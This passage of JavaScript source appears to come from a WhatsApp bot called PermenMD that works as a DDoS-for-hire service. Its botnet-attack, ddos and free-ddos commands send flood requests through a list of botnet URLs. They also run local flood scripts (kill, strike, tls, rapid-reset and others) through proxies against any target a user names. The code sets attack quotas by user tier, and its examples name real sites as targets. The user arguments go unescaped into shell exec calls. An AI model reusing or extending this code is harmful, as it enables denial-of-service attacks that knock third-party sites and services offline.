                                    reply('The botnet list is empty. Use .botnet-add to add URLs.');
                                   break;
                                }
                                await sock.sendMessage(msg.key.remoteJid, {
                                    react: {
                                    text: '🧢',
                                    key: msg.key,
                                  }
                                })

                                const targetUrl = 'https://google.com';
                                const time = 1;
                                const methods = 'tls';
                                let onlineCount = 0;
                                const checkUrls = botnetData.map(async (url) => {
                                    try {
                                        const testUrl = `${url}/permen?target=${targetUrl}&time=${time}&methods=${methods}`;
                                        const response = await axios.get(testUrl, { timeout: 5000 });
                                        
                                        if (response.status === 200) {
                                            onlineCount++;
                                        }
                                    } catch (error) {
                                        console.log(`Failed to reach ${url}: ${error.message}`);
                                    }
                                });
                                await Promise.all(checkUrls);
                                sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
                                    externalAdReply: {
                                    showAdAttribution: true, 
                                    title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
                                    body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
                                    mediaType: 1,  
                                    renderLargerThumbnail : true,
                                    thumbnailUrl: thum,
                                    sourceUrl: ``
                                    }}, caption: `Botnet test complete. Online URLs: ${onlineCount} / ${botnetData.length}`}, {quoted: msg})
                            } catch (error) {
                                reply('Failed to load the botnet list. Make sure botnet.json exists and is properly formatted.');
                            }
                        } else {
                            reply('Only owners can use this command.');
                        }
                        break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                    case 'botnet-attack':
                        if (!isBan || isPrem || isVip || isOwner) {
                            if (args.length >= 3) {
                                const target = args[0];
                                const duration = args[1];
                                const methods = args[2];
                                const userTimelimit = isOwner ? Infinity : database[sender]?.timelimit || 0;
                                if (duration > userTimelimit) {
                                  reply(`The specified duration (${duration} seconds) exceeds your time limit of ${userTimelimit} seconds.`);
                                  break;
                                }
                                let onlineCount = 0;
                                const botnetData = JSON.parse(fs.readFileSync('./botnet.json', 'utf8'));
                                const hostname = target.replace(/^(https?:\/\/)?/, '').split('/')[0];
                                const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
                                const result = scrape.data;    
                                let m2 = `Attack Sended Succesfully
\`\`\`Botnet Active:\`\`\` ${onlineCount} / ${botnetData.length}
\`\`\`Target:\`\`\` ${target}
\`\`\`Duration:\`\`\` ${duration}
\`\`\`Methods:\`\`\` ${methods}
\`\`\`Isp:\`\`\` ${result.isp}
\`\`\`Ip:\`\`\` ${result.query}
\`\`\`As:\`\`\` ${result.as}`

                                if (botnetData.length === 0) {
                                    reply('The botnet list is empty. Use .botnet-add to add URLs.');
                                   break;
                                }
                                const sendAttack = botnetData.map(async (url) => {
                                    try {
                                        const botnetUrl = `${url}/permen?target=${target}&time=${duration}&methods=${methods}`;
                                        const response = await axios.get(botnetUrl, { timeout: 50000 });
                                        
                                        if (response.status === 200) {
                                            onlineCount++;
                                        }
                                    } catch (error) {
                                        console.log(`Failed to reach ${url}: ${error.message}`);
                                    }
                                });
                                await Promise.all(sendAttack);
                                await pushOngoing(target, methods, duration)
                                sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
                                    externalAdReply: {
                                    showAdAttribution: true, 
                                    title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
                                    body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
                                    mediaType: 1,  
                                    renderLargerThumbnail : true,
                                    thumbnailUrl: thum,
                                    sourceUrl: ``
                                    }}, caption: m2}, {quoted: msg})
                                } else {
                                reply("Example: .botnet-attack target duration methods\n.botnet-attack https://google.com 120 kill")
                            }
                        } else {
                            reply("You Don't Have Access To This Command")
                        }
                        break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                    case 'methods':
                        let permenl = `*PermenMisc V11 Methods List*
- raw
- tls
- mix
- kill
- ninja
- http-x
- bypass
- strike
- pidoras
- rapid-reset`
sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
    externalAdReply: {
    showAdAttribution: true, 
    title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
    body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
    mediaType: 1,  
    renderLargerThumbnail : true,
    thumbnailUrl: thum,
    sourceUrl: ``
    }}, caption: permenl}, {quoted: msg})
                        break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                    case 'ddos':
                        if (!isBan || isBasic || isPrem || isVip || isOwner) {
                            if (args.length >= 3) {
                                const target = args[0];
                                const duration = args[1];
                                const methods = args[2];
                                const userTimelimit = isOwner ? Infinity : database[sender]?.timelimit || 0;
                                if (duration > userTimelimit) {
                                  reply(`The specified duration (${duration} seconds) exceeds your time limit of ${userTimelimit} seconds.`);
                                  break;
                                }
                                const hostname = target.replace(/^(https?:\/\/)?/, '').split('/')[0];
                                const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
                                const result = scrape.data;
                                let m2 = `Attack Sended Succesfully
\`\`\`Target:\`\`\` ${target}
\`\`\`Duration:\`\`\` ${duration}
\`\`\`Methods:\`\`\` ${methods}
\`\`\`Isp:\`\`\` ${result.isp}
\`\`\`Ip:\`\`\` ${result.query}
\`\`\`As:\`\`\` ${result.as}`

async function sendLimau() {
    await pushOngoing(target, methods, duration)
    await sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
        externalAdReply: {
        showAdAttribution: true, 
        title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
        body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
        mediaType: 1,  
        renderLargerThumbnail : true,
        thumbnailUrl: thum,
        sourceUrl: ``
        }}, caption: m2}, {quoted: msg})
}
try {
if (methods === 'kill') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXKill.js ${target} ${duration} 100 10`);
    sendLimau()
} else if (methods === 'strike') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXStrike.js GET ${target} ${duration} 10 90 proxy.txt --full`);
    sendLimau()
} else if (methods === 'bypass') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXBypass.js ${target} ${duration} 100 10 proxy.txt`);
    sendLimau()
} else if (methods === 'tls') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXTls.js ${target} ${duration} 100 10`);
    sendLimau()
} else if (methods === 'ninja') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXNinja.js ${target} ${duration}`);
    sendLimau()
} else if (methods === 'mix') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXMix.js ${target} ${duration} 100 10 proxy.txt`);
    sendLimau()
} else if (methods === 'raw') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXRaw.js ${target} ${duration}`);
    sendLimau()
} else if (methods === 'rapid-reset') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXRapid-Reset.js PermenMD ${duration} 10 proxy.txt 80 ${target}`);
    sendLimau()
} else if (methods === 'pidoras') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXPidoras.js ${target} ${duration} 80 10 proxy.txt`)
    sendLimau()
} else if (methods === 'http-x') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/HTTP-X.js ${target} ${duration} 80 10 proxy.txt`)
    sendLimau()
} else {}
} catch (error) {
    reply(`Something Went Wrong \n${error}`)
}
                            } else {
                                reply("Example: .ddos https://google.com 120 kill")
                            }
                        } else {
                            reply("You Don't Have Access To This Command")
                        }
                        break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
                    case 'proxy':
                        if (isOwner) {
                            if (args[0] === 'update') {
                                await sock.sendMessage(msg.key.remoteJid, {
                                    react: {
                                    text: '🧢',
                                    key: msg.key,
                                  }
                                })
                                await exec(`node ./lib/PermenMD/scrape.js`)
                                sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
                                    externalAdReply: {
                                    showAdAttribution: true, 
                                    title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
                                    body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
                                    mediaType: 1,  
                                    renderLargerThumbnail : true,
                                    thumbnailUrl: thum,
                                    sourceUrl: ``
                                    }}, caption: `\`\`\`Proxy Update Succesfully\`\`\``}, {quoted: msg})
                                } else if (args[0] === 'download') {
                                    const fileBuffer = fs.readFileSync('./proxy.txt');
                                    await sock.sendMessage(msg.key.remoteJid, {
                                        document: fileBuffer,
                                        fileName: 'proxy.txt',
                                        mimetype: 'text/plain',
                                    }, { quoted: msg });
                                } else {
                                    reply("Example: .proxy update\nor .proxy download")
                                }
                        } else {
                            reply('Only owners can use this command.');
                        }
                        break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- //
case 'free-ddos':
    if (!isBan) {
        const methodslist = `- strike
- ninja
- raw`
        if (args.length >= 3) {
function resetDailyLimit(sender) {
    const currentDate = new Date().toISOString().split('T')[0];
    if (!database[sender]) {
        database[sender] = { limit: 10, lastReset: currentDate };
    }
    if (database[sender].lastReset !== currentDate) {
        database[sender].limit = 10;
        database[sender].lastReset = currentDate;
        saveDatabase();
    }
}
resetDailyLimit(sender);
            const target = args[0];
            const duration = args[1]
            const methods = args[2];
            const isUnlimitedUser = isOwner || isVip || isPrem || isBasic;
async function sendLimau() {
    if (!isUnlimitedUser) {
    database[sender].limit = (database[sender].limit || 0) - 1;
    saveDatabase();
}
    await pushOngoing(target, methods, duration)
    await sock.sendMessage(msg.key.remoteJid, { video: preview, gifPlayback: true, contextInfo: {
        externalAdReply: {
        showAdAttribution: true, 
        title: '𝙿 𝙴 𝚁 𝙼 𝙴 𝙽 𝙼 𝙸 𝚂 𝙲  𝚅 𝟷 𝟷',
        body: '𝗣𝗲𝗿𝗺𝗲𝗻𝗠𝗗',
        mediaType: 1,  
        renderLargerThumbnail : true,
        thumbnailUrl: thum,
        sourceUrl: ``
        }}, caption: m2}, {quoted: msg})
}
            const senderLimit = database[sender]?.limit;
            const userTimelimit = isUnlimitedUser ? 300 : database[sender]?.timelimit || 0;
            if (duration >= userTimelimit) {
                reply(`Your Time Limit Is ${userTimelimit}`)
                break;
            } else if (senderLimit === 0) {
                reply(`You Doesn't Have Any Attack Limit Left`)
                break;
            } else {
if (methods === 'strike') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXStrike.js GET ${target} ${duration} 1 30 proxy.txt`);
    sendLimau()
} else if (methods === 'ninja') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXNinja.js ${target} ${duration}`);
    sendLimau()
} else if (methods === 'raw') {
	console.log(`recieved`)
    exec(`node ./lib/PermenMD/StarsXRaw.js ${target} ${duration}`);
    sendLimau()
} else {
    reply(`Unknown Methods`)
}
            }
        } else {
            reply("Example: .free-ddos target duration methods\n.free-ddos https://transtv.co.id 60 strike\n*Methods List*\n" + methodslist);
        }
    } else {
        reply('You Are Banned Silly.');
    }
    break;

}
    });
}

startBot();
